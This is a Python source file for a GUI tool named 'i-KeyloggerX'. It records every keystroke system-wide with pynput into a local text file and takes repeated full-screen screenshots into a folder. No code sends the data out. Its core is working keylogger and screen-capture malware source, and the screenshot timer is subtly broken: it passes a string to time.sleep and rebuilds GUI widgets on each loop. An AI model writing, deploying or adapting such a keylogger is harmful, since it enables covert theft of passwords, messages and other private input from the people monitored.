from tkinter import Tk
from typing import Any, Union

from PIL import ImageGrab
import time

from PIL.Image import Image
from pynput.keyboard import Listener
import threading
from typing import *
import datetime
import os
from tkinter import *
import cv2

intial_path = os.getcwd()
txt_file_location = os.path.join(intial_path, 'txt')


def set_records():
    txt_file_location = os.path.join(intial_path, 'txt')

    if not os.path.exists(txt_file_location):
        os.mkdir(txt_file_location)

    os.chdir(txt_file_location)

    file = open('logger.txt', 'a')
    file.write('\n')
    start_time = datetime.datetime.now().strftime('%d-%m-%Y' + ' ' + "%I-%M-%S")
    file.write(f"===================== Monitoring Initialized on {start_time} =====================")
    for _ in range(2):
        file.write('\n')

    file.close()


def get_key(key: Union) -> None:
    global txt_file_location

    os.chdir(txt_file_location)
    key = replace_keys(key)
    with open('logger.txt', 'a') as f:
        f.write(key.replace('\'', '') + '')


def replace_keys(key) -> str:
    key = str(key)
    if key == 'Key.space':
        return ' '
    elif key == 'Key.enter':
        return '\n' + datetime.datetime.now().strftime('%I:%M') + ': '

    elif key == 'Key.backspace':
        return "{Backspace}"

    elif key == 'Key.caps_lock':
        return "{Caps}"

    elif key == 'Key.down':
        return "{Down}"

    elif key == 'Key.up':
        return "{Up}"

    elif key == 'Key.left':
        return "{Left}"

    elif key == 'Key.right':
        return "{Right}"

    elif key == 'Key.shift':
        return "{Shift}"

    return key


def take_screenshots() -> None:
    # interval = save_time()

    ss_file_location = os.path.join(intial_path, 'ss')

    if not os.path.exists(ss_file_location):
        os.mkdir(ss_file_location)

    os.chdir(ss_file_location)

    while True:
        image: Union[Optional[Image], Any] = ImageGrab.grab()
        now = time.strftime("%a-%d-%m-%Y" + ' ' + "%I-%M-%S")
        assert isinstance(image.save, object)
        image.save(now + '.png')
        timer()

#run full code

def main() -> object:
    root.destroy()
    thread2 = threading.Thread(target=take_screenshots)
    thread2.start()
    set_records()

    with Listener(on_press=get_key) as listener:
        listener.join()


def send_interval():
    interval = selected_time.get()
    if len(interval) == 0:
        Label(root, text="Please Input the time again. Input was empty. ", bg="black", fg="cyan2",
              font="Helvetica 12 bold").grid(row=1, column=0, sticky=W, padx=(20, 100), pady=(50, 100))

    elif not interval.isdigit():
        Label(root, text="Please Input a number. Characters were inputed.  ", bg="black", fg="cyan2",
              font="Helvetica 12 bold").grid(row=1, column=0, sticky=W, padx=(20, 100), pady=(0, 100))


    elif len(interval) > 0 and interval.isdigit():
        Label(root, text="Launch Logger: ", bg="black", fg="cyan2", font=" Helvetica 14 bold").grid(row=6,
                                                                                                    column=0,
                                                                                                    sticky=W,
                                                                                                    padx=(
                                                                                                        20, 100),
                                                                                                    pady=(
                                                                                                        10, 100))
        Button(root, fg="black", bg="cyan2", text="Start screenshot", command=main, width=10).grid(row=6,
                                                                                                column=2,

                                                                                                sticky=W)

        return interval

def timer():
    interval = send_interval()
    time.sleep(interval)


#gui interface configs



root = Tk()
img = cv2.imread('pic4.png')
cv2.imwrite('png4.png', img)
# photo_path = os.getcwd() + '\png4.png'
photo = PhotoImage(file=os.getcwd() + '\png4.png')
Label(root, image=photo, bg="black").grid(row=2, column=3, sticky=N)

root.title('i-KeyloggerX ')
root.configure(background="black")
root.config(height=500, width=500)


Label(root, text="Enter the time interval between each screenshot in seconds: ", bg="black", fg="cyan2",
              font="Helvetica 12 bold").grid(row=0, column=0, sticky=W, padx=(20, 100), pady=(10, 100))

selected_time = Entry(root, width=10, bg="cyan2")

selected_time.grid(row=0, column=0, sticky=W, padx=(20, 100))

Button(root, fg="black", bg="cyan2", text="Submit Time", width=10, command=send_interval).grid(row=0, column=0,
                                                                        sticky=W,
                                                                        padx=(100, 100))



root.mainloop()




